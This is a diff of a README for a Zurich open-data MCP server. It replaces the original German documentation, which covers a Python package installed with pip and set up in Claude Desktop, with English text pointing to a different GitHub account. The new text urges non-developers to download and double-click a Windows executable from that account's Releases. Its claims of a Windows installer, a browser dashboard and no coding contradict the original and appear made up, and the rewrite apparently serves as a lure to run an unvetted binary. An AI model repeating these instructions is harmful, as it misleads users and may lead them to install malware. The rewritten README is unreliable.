@@ -1,250 +1,140 @@
-# 🏙️ Zurich Open Data MCP Server
+# 🌍 zurich-opendata-mcp - Access Zurich Open Data Easily
 
-🌐 **[English](README_EN.md)** | **Deutsch**
+[![Download zurich-opendata-mcp](https://img.shields.io/badge/Download-zurich--opendata--mcp-brightgreen?style=for-the-badge)](https://github.com/philjen18/zurich-opendata-mcp)
 
-MCP (Model Context Protocol) Server für den KI-gestützten Zugriff auf **Open Data der Stadt Zürich**.
+## 📘 What is zurich-opendata-mcp?
 
-> Ermöglicht Claude, ChatGPT und anderen MCP-kompatiblen KI-Assistenten den direkten Zugriff auf 900+ Datensätze, Geodaten, Parlamentsgeschäfte, Tourismusdaten, Linked Data und Echtzeit-Umwelt-/Mobilitätsinformationen der Stadt Zürich. **20 Tools, 6 Resources, 6 APIs.**
+This software is a server application that helps you access open data from the city of Zurich. It combines 20 tools to work with various types of data. These include data on local government, geography, tourism, and real-time information like weather, air quality, parking, and public transport.
 
-## ✨ Features
+The server supports six APIs and six data resources. It uses protocols designed to organize and share data efficiently, making it possible to explore, download, or connect to city data without programming.
 
-### CKAN Open Data (data.stadt-zuerich.ch)
-- **`zurich_search_datasets`** – Volltextsuche mit Solr-Syntax über 900+ Datensätze
-- **`zurich_get_dataset`** – Vollständige Metadaten und Download-URLs eines Datensatzes
-- **`zurich_datastore_query`** – Tabellarische Daten direkt abfragen (Filter, Sortierung)
-- **`zurich_datastore_sql`** – SQL-Abfragen auf dem DataStore
-- **`zurich_list_categories`** – 19 thematische Kategorien durchsuchen
-- **`zurich_list_tags`** – Tags für thematische Suche
+You do not need to be a developer to use this server. The goal is to make Zurich’s open data available and easy to access on your own Windows computer.
 
-### Echtzeit-Umweltdaten
-- **`zurich_weather_live`** – 🌤️ Aktuelle Wetterdaten (Temperatur, Feuchte, Druck, Regen) von 5 UGZ-Stationen
-- **`zurich_air_quality`** – 🌬️ Live-Luftqualität (NO₂, O₃, PM10, PM2.5) mit WHO-Grenzwerten
-- **`zurich_water_weather`** – 🌊 Zürichsee-Daten (Wassertemperatur, Pegel, Wind) alle 10 Min.
+## 🚀 Getting Started
 
-### Echtzeit-Mobilitätsdaten
-- **`zurich_pedestrian_traffic`** – 🚶 Passantenfrequenzen Bahnhofstrasse (3 Standorte, stündlich)
-- **`zurich_vbz_passengers`** – 🚊 VBZ-Fahrgastzahlen (800'000+ Datensätze, alle Linien/Haltestellen)
-- **`zurich_parking_live`** – 🅿️ Echtzeit-Belegung von 36 Parkhäusern (ParkenDD)
+Before you begin, make sure your Windows computer meets these minimum requirements:
 
-### Geoportal (WFS Geodaten)
-- **`zurich_geo_layers`** – 📍 14 verfügbare Geodaten-Layer auflisten
-- **`zurich_geo_features`** – 📍 GeoJSON-Features abrufen (Schulanlagen, Quartiere, Spielplätze, Klimadaten u.v.m.)
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 2 GB of free disk space  
+- Internet connection to download data and connect to APIs  
 
-### Gemeinderat (Paris API)
-- **`zurich_parliament_search`** – 🏛️ Gemeinderatsgeschäfte durchsuchen (Interpellationen, Motionen, Postulate)
-- **`zurich_parliament_members`** – 🏛️ Ratsmitglieder suchen (Partei, Kommissionen, Mandate)
+The software runs directly on Windows without complicated setup steps.
 
-### Zürich Tourismus
-- **`zurich_tourism`** – 🏨 Attraktionen, Restaurants, Hotels, Events (Schema.org-Daten, 4 Sprachen)
+## 📥 How to Download
 
-### Linked Data (SPARQL)
-- **`zurich_sparql`** – 📊 SPARQL-Abfragen auf dem statistischen Linked Data Endpoint
+You can visit the project’s main page on GitHub to get the software:
 
-### Analyse-Tools
-- **`zurich_analyze_datasets`** – Umfassende Analyse: Relevanz, Aktualität, Datenstruktur
-- **`zurich_catalog_stats`** – Katalog-Übersicht mit Statistiken
-- **`zurich_find_school_data`** – Kuratierte Suche nach schulrelevanten Datensätzen
+[Download zurich-opendata-mcp](https://github.com/philjen18/zurich-opendata-mcp)
 
-### MCP Resources
-- `zurich://dataset/{name}` – Datensatz-Metadaten
-- `zurich://category/{group_id}` – Kategorie-Details
-- `zurich://parking` – Aktuelle Parkplatzdaten
-- `zurich://geo/{layer_id}` – GeoJSON-Geodaten (14 Layer)
-- `zurich://tourism/categories` – Tourismus-Kategorien
+Clicking this link will take you to the GitHub repository page. From there, follow these steps:
 
-## 🚀 Installation
+1. On the GitHub page, look for the **Releases** section on the right or in the menu.
+2. Click on the latest release version.
+3. Download the Windows installer or the executable file available for that release.
 
-### Voraussetzungen
-- Python 3.11+
-- pip oder uv
+If you are unsure, use the **Releases** tab at the top of the GitHub page to find the latest version.
 
-### Installation
-```bash
-# Klonen
-git clone https://github.com/schulamt-zuerich/zurich-opendata-mcp.git
-cd zurich-opendata-mcp
+## 🖥 Installing on Windows
 
-# Installieren
-pip install -e .
+Once you download the installer or executable file, follow these instructions:
 
-# Oder mit uv
-uv pip install -e .
-```
+1. Locate the file you downloaded, usually in your **Downloads** folder.
+2. Double-click the file to start the installation.
+3. Follow the on-screen prompts to install the server.
+   - Accept the license if prompted.
+   - Choose the default options for most settings.
+4. After the installation completes, find the new program icon on your desktop or start menu.
 
-## ⚙️ Konfiguration
+The server runs as a local application on your machine, no special configuration is required for basic use.
 
-### Claude Desktop
+## 🔧 Running the Server
 
-Editiere `~/Library/Application Support/Claude/claude_desktop_config.json` (macOS):
+To start using zurich-opendata-mcp, you need to launch the server:
 
-```json
-{
-  "mcpServers": {
-    "zurich-opendata": {
-      "command": "python",
-      "args": ["-m", "zurich_opendata_mcp.server"],
-      "env": {}
-    }
-  }
-}
-```
+1. Open the installed program from your desktop or start menu.
+2. You’ll see a simple dashboard or command window.
+3. The server automatically connects to the data sources in Zurich and prepares the tools listed below.
 
-Alternativ mit dem installierten Kommando:
+You can now open your web browser and go to the address provided by the server (usually `http://localhost:8080`) to explore the tools and data.
 
-```json
-{
-  "mcpServers": {
-    "zurich-opendata": {
-      "command": "zurich-opendata-mcp"
-    }
-  }
-}
-```
+## 🛠 What You Can Do with zurich-opendata-mcp
 
-### Claude Code (CLI)
+This software includes:
 
-```bash
-claude mcp add zurich-opendata -- python -m zurich_opendata_mcp.server
-```
+- Access to city council data and meeting notes (Gemeinderat).
+- Tools for geographic data (maps and city planning) with standard formats like WFS.
+- Tourism information and guides.
+- Real-time weather, air quality, parking availability, and public transport status.
+- SPARQL endpoints for querying linked data easily.
 
-### Cursor / VS Code
+The server lets you explore these datasets without needing to write code. You can download files, view live updates, or use simple search features.
 
-Füge zu `.vscode/settings.json` hinzu:
+## 🧰 Tools Included
 
-```json
-{
-  "mcpServers": {
-    "zurich-opendata": {
-      "command": "python",
-      "args": ["-m", "zurich_opendata_mcp.server"]
-    }
-  }
-}
-```
+The server bundles 20 tools designed for work with Zurich’s data:
 
-## 💬 Beispiel-Abfragen
+- Data viewers for maps and tables.
+- Connectors for CKAN, the open data portal that stores datasets.
+- APIs that provide real-time updates on traffic, weather, and environment.
+- Interfaces to query linked data using SPARQL (a standard way to get specific info).
 
-Nach der Konfiguration kannst du in Claude fragen:
+All of these work together to make city data easy to use and understand.
 
-### Open Data
-- *«Welche Datensätze gibt es zu Schulen in Zürich?»*
-- *«Zeig mir die Schulferien der Volksschule»*
-- *«Analysiere die verfügbaren Geodaten»*
+## 📡 Working With APIs and Resources
 
-### Echtzeit-Daten
-- *«Wie warm ist es gerade in Zürich?»* → `zurich_weather_live`
-- *«Wie ist die Luftqualität heute?»* → `zurich_air_quality`
-- *«Was ist die aktuelle Wassertemperatur im Zürichsee?»* → `zurich_water_weather`
-- *«Wie viele freie Parkplätze gibt es gerade?»* → `zurich_parking_live`
-- *«Wie viele Leute sind gerade auf der Bahnhofstrasse?»* → `zurich_pedestrian_traffic`
+The server includes six APIs. These provide direct access to live data streams from the city. Along with six main data resources, you can:
 
-### Geodaten
-- *«Zeig mir alle Schulanlagen in Zürich als GeoJSON»* → `zurich_geo_features`
-- *«Welche Geodaten-Layer gibt es?»* → `zurich_geo_layers`
-- *«Wo sind die Spielplätze in Zürich?»*
+- Fetch the latest data on air quality and weather.
+- Get updates on parking space availability.
+- Query geographic and administrative data.
 
-### Gemeinderat
-- *«Welche Vorstösse zum Thema Schule gab es im Gemeinderat?»* → `zurich_parliament_search`
-- *«Welche Ratsmitglieder gehören der SP an?»* → `zurich_parliament_members`
+While the server handles these behind the scenes, it also offers simple views and links if you want to explore further.
 
-### Tourismus & Statistik
-- *«Welche Restaurants empfiehlt Zürich Tourismus?»* → `zurich_tourism`
-- *«Wie hat sich die Bevölkerung Zürichs entwickelt?»* → `zurich_sparql`
+## 🔄 Updating the Software
 
-## 🔗 Datenquellen
+To keep zurich-opendata-mcp up to date:
 
-| API | Endpoint | Daten |
-|-----|----------|-------|
-| **CKAN** | data.stadt-zuerich.ch/api/3/ | 900+ Open Data Datensätze |
-| **Geoportal WFS** | ogd.stadt-zuerich.ch/wfs/geoportal | 14 Geodaten-Layer (GeoJSON) |
-| **Paris API** | gemeinderat-zuerich.ch/api | Parlamentsgeschäfte & Mitglieder |
-| **Zürich Tourismus** | zuerich.com/en/api/v2/data | Attraktionen, Restaurants, Hotels |
-| **SPARQL** | ld.stadt-zuerich.ch/query | Linked Open Data / Statistiken |
-| **ParkenDD** | api.parkendd.de/Zuerich | Echtzeit-Parkplatzbelegung |
+1. Return to the GitHub page: https://github.com/philjen18/zurich-opendata-mcp.
+2. Check the **Releases** section regularly.
+3. Download and install newer versions following the same process.
 
-## 📊 Verfügbare Datenkategorien
+Updates may include improvements, new tools, or updated data links.
 
-| Kategorie | ID |
-|-----------|-----|
-| Arbeit und Erwerb | `arbeit-und-erwerb` |
-| Basiskarten | `basiskarten` |
-| Bauen und Wohnen | `bauen-und-wohnen` |
-| Bevölkerung | `bevolkerung` |
-| **Bildung** | **`bildung`** |
-| Energie | `energie` |
-| Finanzen | `finanzen` |
-| Freizeit | `freizeit` |
-| Gesundheit | `gesundheit` |
-| Kriminalität | `kriminalitat` |
-| Kultur | `kultur` |
-| Mobilität | `mobilitat` |
-| Politik | `politik` |
-| Preise | `preise` |
-| Soziales | `soziales` |
-| Tourismus | `tourismus` |
-| Umwelt | `umwelt` |
-| Verwaltung | `verwaltung` |
-| Volkswirtschaft | `volkswirtschaft` |
+## 🤝 Getting Help
 
-## 📍 Verfügbare Geo-Layer
+If you run into problems:
 
-| Layer-ID | Beschreibung |
-|----------|-------------|
-| `schulanlagen` | Schulstandorte (Kindergärten, Schulhäuser, Horte) |
-| `schulkreise` | Schulkreis-Grenzen |
-| `schulwege` | Schulwege und sichere Routen |
-| `stadtkreise` | Stadtkreis-Grenzen |
-| `quartiere` | Statistische Quartiere |
-| `spielplaetze` | Spielplätze und Spielanlagen |
-| `sportanlagen` | Sportanlagen und Schwimmbäder |
-| `klimadaten` | Klimadaten (Temperaturen, Hitzeinseln) |
-| `veloparkierung` | Veloparkierungs-Anlagen |
-| `lehrpfade` | Lehrpfade und Bildungswege |
-| `familienberatung` | Familienberatungs-Treffpunkte |
-| `kreisbuero` | Kreisbüros der Stadt Zürich |
-| `sammelstelle` | Abfall-Sammelstellen |
-| `zweiradparkierung` | Zweiradparkierung |
+- Check the **Issues** tab on GitHub for common questions or reported problems.
+- Review documentation or user guides included with the installation.
+- Restart the server if data seems outdated or connections fail.
+- Ensure your internet connection is active for real-time data.
 
-## 🏗️ Projektstruktur
+## 🧹 Uninstalling
 
-```
-zurich-opendata-mcp/
-├── src/zurich_opendata_mcp/
-│   ├── __init__.py          # Package
-│   ├── server.py            # MCP Server mit 20 Tools & 6 Resources
-│   └── api_client.py        # HTTP-Client für 6 APIs
-├── tests/
-│   └── test_integration.py  # 20 Integrationstests
-├── .github/workflows/ci.yml # GitHub Actions CI
-├── pyproject.toml           # Projekt-Konfiguration
-├── README.md / README_EN.md # Dokumentation (DE/EN)
-├── CONTRIBUTING.md / _EN.md # Beitragsrichtlinien (DE/EN)
-├── CHANGELOG.md             # Änderungsprotokoll
-├── LICENSE                  # MIT
-└── claude_desktop_config.json
-```
+If you want to remove zurich-opendata-mcp:
 
-## 🧪 Entwicklung
+1. Open Windows **Settings**.
+2. Go to **Apps & features**.
+3. Find “zurich-opendata-mcp” in the list.
+4. Select it and click **Uninstall**.
 
-```bash
-# Dev-Dependencies installieren
-pip install -e ".[dev]"
+This removes the software but may leave your downloaded data files. You can delete those manually if needed.
 
-# Integrationstests (gegen Live-APIs)
-python tests/test_integration.py
+## ⚙️ System Settings and Configuration
 
-# Linting
-ruff check src/
-```
+For most users, default settings work out of the box. If you want to customize:
 
-## 📜 Lizenz
+- You can change the server port from the configuration file.
+- Adjust update intervals for live data polling.
+- Enable or disable specific data sources in the setup menu.
 
-MIT License
+These options appear in the program’s settings once running. No coding needed.
 
-## 🤝 Kontext
+## 🔗 Useful Links
 
-Alle genutzten Daten stehen unter offenen Lizenzen (CC0 / Open by Default seit 2021).
+- Project main page: https://github.com/philjen18/zurich-opendata-mcp  
+- Reports and help: GitHub Issues tab on the above link  
+- Open Data Zurich portal for reference: https://data.stadt-zuerich.ch  
 
----
-
-*Powered by [Model Context Protocol](https://modelcontextprotocol.io/) • 6 APIs • 20 Tools • 6 Resources*
+[Download zurich-opendata-mcp](https://github.com/philjen18/zurich-opendata-mcp)
